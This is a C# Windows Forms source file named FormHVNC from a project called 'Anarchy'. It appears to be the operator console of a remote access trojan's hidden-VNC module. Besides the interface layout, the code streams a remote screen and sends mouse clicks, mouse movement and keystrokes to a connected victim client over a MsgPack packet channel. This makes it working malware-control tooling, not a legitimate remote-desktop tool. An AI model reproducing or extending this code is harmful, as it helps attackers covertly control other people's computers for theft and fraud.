using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;
using Anarchy.Properties;
using Anarchy.StreamLibrary;
using Anarchy.StreamLibrary.UnsafeCodecs;
using Guna.UI2.WinForms;
using Siticone.UI.WinForms;

namespace Anarchy.Forms;

public class FormHVNC : Form
{
    public int FPS;

    public Stopwatch sw = Stopwatch.StartNew();

    public IUnsafeCodec decoder = new UnsafeStreamCodec(60);

    public Size rdSize;

    private bool isMouse;

    private bool isKeyboard;

    public object syncPicbox = new object();

    private readonly List<Keys> _keysPressed;

    private const int cGrip = 16;

    private const int cCaption = 32;

    private IContainer components;

    public PictureBox pictureBox1;

    public System.Windows.Forms.Timer timer1;

    private Guna2Panel guna2Panel2;

    private SiticoneControlBox siticoneControlBox4;

    private SiticoneControlBox siticoneControlBox3;

    private Guna2DragControl guna2DragControl1;

    private Guna2ResizeForm guna2ResizeForm1;

    private Guna2Panel guna2Panel1;

    internal Guna2CircleProgressBar Guna2CircleProgressBar2;

    private Guna2Button guna2Button8;

    private Guna2Elipse guna2Elipse1;

    private Guna2Elipse guna2Elipse2;

    public Guna2Button button1;

    public Guna2NumericUpDown numericUpDown1;

    private Label label1;

    private SiticoneControlBox siticoneControlBox1;

    private Guna2BorderlessForm guna2BorderlessForm1;

    public Form1 F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public string FullPath { get; set; }

    public Image GetImage { get; set; }

    public FormHVNC()
    {
        this._keysPressed = new List<Keys>();
        this.InitializeComponent();
        base.SetStyle(ControlStyles.ResizeRedraw, value: true);
        pictureBox1.KeyPress += PictureBoxVNC_KeyPress;
    }

    private void PictureBoxVNC_KeyPress(object sender, KeyPressEventArgs e)
    {
        MsgPack msgpack = new MsgPack();
        msgpack.ForcePathObject("Pac_ket").AsString = "KeyboardDown";
        msgpack.ForcePathObject("Key").AsString = Convert.ToBase64String(Encoding.UTF8.GetBytes(e.KeyChar.ToString()));
        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
    }

    protected override void WndProc(ref Message m)
    {
        if (m.Msg == 132)
        {
            Point p;
            p = new Point(m.LParam.ToInt32());
            p = base.PointToClient(p);
            if (p.Y < 32)
            {
                m.Result = (IntPtr)2;
                return;
            }
            if (p.X >= base.ClientSize.Width - 16 && p.Y >= base.ClientSize.Height - 16)
            {
                m.Result = (IntPtr)17;
                return;
            }
        }
        base.WndProc(ref m);
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
            {
                base.Close();
            }
        }
        catch
        {
            base.Close();
        }
    }

    private void FormRemoteDesktop_Load(object sender, EventArgs e)
    {
        try
        {
            //this.button1.Tag = "stop";
            button1.Tag = "play";
        }
        catch
        {
        }
    }

    private void Button1_Click(object sender, EventArgs e)
    {
        if (this.button1.Tag == "play")
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "capture";
            msgPack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(this.numericUpDown1.Value.ToString());
            this.decoder = new UnsafeStreamCodec(Convert.ToInt32(this.numericUpDown1.Value));
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
            this.numericUpDown1.Enabled = false;
            this.button1.Tag = "stop";
            this.button1.Image = Resources.stop;
        }
        else
        {
            this.button1.Tag = "play";
            try
            {
                MsgPack msgPack2;
                msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "Stop";
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack2.Encode2Bytes());
            }
            catch
            {
            }
            this.numericUpDown1.Enabled = true;
            this.button1.Image = Resources.play;
        }
    }

    private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
    {
        try
        {
            if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus)
            {
                Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                if (e.Button == MouseButtons.Left)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "MouseLeftDown";
                    msgpack.ForcePathObject("X").AsInteger = p.X;
                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
                if (e.Button == MouseButtons.Right)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "MouseRightDown";
                    msgpack.ForcePathObject("X").AsInteger = p.X;
                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
        }
        catch { }
    }

    private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
    {
        try
        {
            if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus)
            {
                Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                if (e.Button == MouseButtons.Left)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "MouseLeftUp";
                    msgpack.ForcePathObject("X").AsInteger = p.X;
                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
                if (e.Button == MouseButtons.Right)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "MouseRightUp";
                    msgpack.ForcePathObject("X").AsInteger = p.X;
                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }

            }
        }
        catch { }
    }

    private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
    {
        try
        {
            if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus)
            {
                Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "MouseMove";
                msgpack.ForcePathObject("X").AsInteger = p.X;
                msgpack.ForcePathObject("Y").AsInteger = p.Y;
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }
        catch { }
    }

    private void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
    {
        try
        {
            if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus)
            {
                Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "MouseDoubleClick";
                msgpack.ForcePathObject("X").AsInteger = p.X;
                msgpack.ForcePathObject("Y").AsInteger = p.Y;
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }
        catch { }
    }

    private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
    {
        try
        {
            this.GetImage?.Dispose();
            ThreadPool.QueueUserWorkItem(delegate
            {
                this.Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    

    private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
    {
        if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && base.ContainsFocus && this.isKeyboard)
        {
            if (!this.IsLockKey(e.KeyCode))
            {
                e.Handled = true;
            }
            this._keysPressed.Remove(e.KeyCode);
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
            msgPack.ForcePathObject("Option").AsString = "keyboardClick";
            msgPack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
            msgPack.ForcePathObject("keyIsDown").SetAsBoolean(bVal: false);
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
    }

    private bool IsLockKey(Keys key)
    {
        if ((key & Keys.Capital) != Keys.Capital && (key & Keys.NumLock) != Keys.NumLock)
        {
            return (key & Keys.Scroll) == Keys.Scroll;
        }
        return true;
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormHVNC));
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
            this.label1 = new System.Windows.Forms.Label();
            this.siticoneControlBox1 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.siticoneControlBox4 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.siticoneControlBox3 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.guna2ResizeForm1 = new Guna.UI2.WinForms.Guna2ResizeForm(this.components);
            this.guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
            this.numericUpDown1 = new Guna.UI2.WinForms.Guna2NumericUpDown();
            this.button1 = new Guna.UI2.WinForms.Guna2Button();
            this.Guna2CircleProgressBar2 = new Guna.UI2.WinForms.Guna2CircleProgressBar();
            this.guna2Button8 = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Elipse1 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.guna2Elipse2 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
            this.guna2Panel2.SuspendLayout();
            this.guna2Panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // timer1
            // 
            this.timer1.Interval = 2000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // guna2Panel2
            // 
            this.guna2Panel2.BackColor = System.Drawing.Color.Transparent;
            this.guna2Panel2.Controls.Add(this.label1);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox1);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox4);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox3);
            this.guna2Panel2.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(72)))), ((int)(((byte)(75)))));
            this.guna2Panel2.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
            this.guna2Panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.guna2Panel2.Location = new System.Drawing.Point(48, 0);
            this.guna2Panel2.Name = "guna2Panel2";
            this.guna2Panel2.ShadowDecoration.Color = System.Drawing.Color.White;
            this.guna2Panel2.ShadowDecoration.Depth = 15;
            this.guna2Panel2.Size = new System.Drawing.Size(637, 23);
            this.guna2Panel2.TabIndex = 29;
            // 
            // label1
            // 
            this.label1.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(6, 3);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(105, 18);
            this.label1.TabIndex = 23;
            this.label1.Text = "HVNC";
            // 
            // siticoneControlBox1
            // 
            this.siticoneControlBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.siticoneControlBox1.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox1.BorderRadius = 10;
            this.siticoneControlBox1.ControlBoxType = Siticone.UI.WinForms.Enums.ControlBoxType.MaximizeBox;
            this.siticoneControlBox1.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox1.HoveredState.Parent = this.siticoneControlBox1;
            this.siticoneControlBox1.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox1.Location = new System.Drawing.Point(592, 3);
            this.siticoneControlBox1.Name = "siticoneControlBox1";
            this.siticoneControlBox1.ShadowDecoration.Parent = this.siticoneControlBox1;
            this.siticoneControlBox1.Size = new System.Drawing.Size(18, 18);
            this.siticoneControlBox1.TabIndex = 22;
            // 
            // siticoneControlBox4
            // 
            this.siticoneControlBox4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.siticoneControlBox4.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.BorderRadius = 10;
            this.siticoneControlBox4.ControlBoxType = Siticone.UI.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.siticoneControlBox4.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.HoveredState.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox4.Location = new System.Drawing.Point(568, 3);
            this.siticoneControlBox4.Name = "siticoneControlBox4";
            this.siticoneControlBox4.ShadowDecoration.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.Size = new System.Drawing.Size(18, 18);
            this.siticoneControlBox4.TabIndex = 21;
            // 
            // siticoneControlBox3
            // 
            this.siticoneControlBox3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.siticoneControlBox3.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox3.BorderRadius = 10;
            this.siticoneControlBox3.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox3.HoveredState.Parent = this.siticoneControlBox3;
            this.siticoneControlBox3.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox3.Location = new System.Drawing.Point(616, 3);
            this.siticoneControlBox3.Name = "siticoneControlBox3";
            this.siticoneControlBox3.PressedColor = System.Drawing.Color.DarkRed;
            this.siticoneControlBox3.ShadowDecoration.Parent = this.siticoneControlBox3;
            this.siticoneControlBox3.Size = new System.Drawing.Size(18, 18);
            this.siticoneControlBox3.TabIndex = 20;
            // 
            // guna2DragControl1
            // 
            this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6D;
            this.guna2DragControl1.TargetControl = this.guna2Panel2;
            this.guna2DragControl1.UseTransparentDrag = true;
            // 
            // guna2Panel1
            // 
            this.guna2Panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2Panel1.Controls.Add(this.numericUpDown1);
            this.guna2Panel1.Controls.Add(this.button1);
            this.guna2Panel1.Controls.Add(this.Guna2CircleProgressBar2);
            this.guna2Panel1.Controls.Add(this.guna2Button8);
            this.guna2Panel1.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(72)))), ((int)(((byte)(75)))));
            this.guna2Panel1.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
            this.guna2Panel1.Dock = System.Windows.Forms.DockStyle.Left;
            this.guna2Panel1.Location = new System.Drawing.Point(0, 0);
            this.guna2Panel1.Name = "guna2Panel1";
            this.guna2Panel1.Size = new System.Drawing.Size(48, 387);
            this.guna2Panel1.TabIndex = 30;
            // 
            // numericUpDown1
            // 
            this.numericUpDown1.BackColor = System.Drawing.Color.Transparent;
            this.numericUpDown1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.numericUpDown1.BorderRadius = 3;
            this.numericUpDown1.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.numericUpDown1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.numericUpDown1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.numericUpDown1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.numericUpDown1.DisabledState.UpDownButtonFillColor = System.Drawing.Color.FromArgb(((int)(((byte)(177)))), ((int)(((byte)(177)))), ((int)(((byte)(177)))));
            this.numericUpDown1.DisabledState.UpDownButtonForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(203)))), ((int)(((byte)(203)))), ((int)(((byte)(203)))));
            this.numericUpDown1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.numericUpDown1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.numericUpDown1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.numericUpDown1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(126)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
            this.numericUpDown1.Increment = new decimal(new int[] {
            10,
            0,
            0,
            0});
            this.numericUpDown1.Location = new System.Drawing.Point(2, 106);
            this.numericUpDown1.Minimum = new decimal(new int[] {
            20,
            0,
            0,
            0});
            this.numericUpDown1.Name = "numericUpDown1";
            this.numericUpDown1.ShadowDecoration.BorderRadius = 4;
            this.numericUpDown1.ShadowDecoration.Color = System.Drawing.Color.Silver;
            this.numericUpDown1.ShadowDecoration.Depth = 7;
            this.numericUpDown1.ShadowDecoration.Enabled = true;
            this.numericUpDown1.Size = new System.Drawing.Size(43, 25);
            this.numericUpDown1.TabIndex = 127;
            this.numericUpDown1.UpDownButtonFillColor = System.Drawing.Color.Plum;
            this.numericUpDown1.UpDownButtonForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.numericUpDown1.Value = new decimal(new int[] {
            50,
            0,
            0,
            0});
            // 
            // button1
            // 
            this.button1.Animated = true;
            this.button1.BackColor = System.Drawing.Color.Transparent;
            this.button1.BackgroundImage = global::Anarchy.Properties.Resources.stop;
            this.button1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.button1.BorderRadius = 4;
            this.button1.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.button1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.button1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.button1.ForeColor = System.Drawing.Color.White;
            this.button1.Image = global::Anarchy.Properties.Resources.stop;
            this.button1.Location = new System.Drawing.Point(3, 63);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(42, 47);
            this.button1.TabIndex = 55;
            this.button1.Click += new System.EventHandler(this.Button1_Click);
            // 
            // Guna2CircleProgressBar2
            // 
            this.Guna2CircleProgressBar2.Animated = true;
            this.Guna2CircleProgressBar2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(50)))));
            this.Guna2CircleProgressBar2.FillThickness = 10;
            this.Guna2CircleProgressBar2.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.Guna2CircleProgressBar2.ForeColor = System.Drawing.Color.White;
            this.Guna2CircleProgressBar2.Location = new System.Drawing.Point(8, 3);
            this.Guna2CircleProgressBar2.Minimum = 0;
            this.Guna2CircleProgressBar2.Name = "Guna2CircleProgressBar2";
            this.Guna2CircleProgressBar2.ProgressColor = System.Drawing.Color.Magenta;
            this.Guna2CircleProgressBar2.ProgressColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(126)))), ((int)(((byte)(106)))), ((int)(((byte)(231)))));
            this.Guna2CircleProgressBar2.ProgressEndCap = System.Drawing.Drawing2D.LineCap.Round;
            this.Guna2CircleProgressBar2.ProgressStartCap = System.Drawing.Drawing2D.LineCap.Round;
            this.Guna2CircleProgressBar2.ProgressThickness = 10;
            this.Guna2CircleProgressBar2.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
            this.Guna2CircleProgressBar2.Size = new System.Drawing.Size(36, 36);
            this.Guna2CircleProgressBar2.TabIndex = 22;
            this.Guna2CircleProgressBar2.Value = 70;
            // 
            // guna2Button8
            // 
            this.guna2Button8.Animated = true;
            this.guna2Button8.BackColor = System.Drawing.Color.Transparent;
            this.guna2Button8.BorderRadius = 4;
            this.guna2Button8.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Button8.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.guna2Button8.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2Button8.ForeColor = System.Drawing.Color.White;
            this.guna2Button8.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button8.Image")));
            this.guna2Button8.Location = new System.Drawing.Point(16, 421);
            this.guna2Button8.Name = "guna2Button8";
            this.guna2Button8.Size = new System.Drawing.Size(24, 28);
            this.guna2Button8.TabIndex = 54;
            this.guna2Button8.UseTransparentBackground = true;
            this.guna2Button8.Visible = false;
            // 
            // guna2Elipse1
            // 
            this.guna2Elipse1.TargetControl = this.guna2Panel2;
            // 
            // guna2Elipse2
            // 
            this.guna2Elipse2.TargetControl = this.guna2Panel1;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.pictureBox1.Location = new System.Drawing.Point(48, 24);
            this.pictureBox1.Margin = new System.Windows.Forms.Padding(2);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(634, 361);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 0;
            this.pictureBox1.TabStop = false;
            this.pictureBox1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.pictureBox1_MouseDoubleClick);
            this.pictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(this.PictureBox1_MouseDown);
            this.pictureBox1.MouseEnter += new System.EventHandler(this.pictureBox1_MouseEnter);
            this.pictureBox1.MouseLeave += new System.EventHandler(this.pictureBox1_MouseLeave);
            this.pictureBox1.MouseHover += new System.EventHandler(this.pictureBox1_MouseHover);
            this.pictureBox1.MouseMove += new System.Windows.Forms.MouseEventHandler(this.pictureBox1_MouseMove);
            this.pictureBox1.MouseUp += new System.Windows.Forms.MouseEventHandler(this.PictureBox1_MouseUp);
            // 
            // guna2BorderlessForm1
            // 
            this.guna2BorderlessForm1.AnimateWindow = true;
            this.guna2BorderlessForm1.BorderRadius = 6;
            this.guna2BorderlessForm1.ContainerControl = this;
            this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6D;
            this.guna2BorderlessForm1.HasFormShadow = false;
            this.guna2BorderlessForm1.ShadowColor = System.Drawing.Color.Honeydew;
            this.guna2BorderlessForm1.TransparentWhileDrag = true;
            // 
            // FormHVNC
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(32)))), ((int)(((byte)(37)))));
            this.ClientSize = new System.Drawing.Size(685, 387);
            this.Controls.Add(this.guna2Panel2);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.guna2Panel1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.KeyPreview = true;
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MinimumSize = new System.Drawing.Size(442, 300);
            this.Name = "FormHVNC";
            this.Text = "Remote Desktop";
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.FormRemoteDesktop_FormClosed);
            this.Load += new System.EventHandler(this.FormRemoteDesktop_Load);
            this.KeyUp += new System.Windows.Forms.KeyEventHandler(this.FormRemoteDesktop_KeyUp);
            this.guna2Panel2.ResumeLayout(false);
            this.guna2Panel1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

    }

    private void pictureBox1_MouseEnter(object sender, EventArgs e)
    {
        pictureBox1.Focus();
    }

    private void pictureBox1_MouseHover(object sender, EventArgs e)
    {
        pictureBox1.Focus();
    }

    private void pictureBox1_MouseLeave(object sender, EventArgs e)
    {
        FindForm().ActiveControl = null;
        ActiveControl = null;
    }
}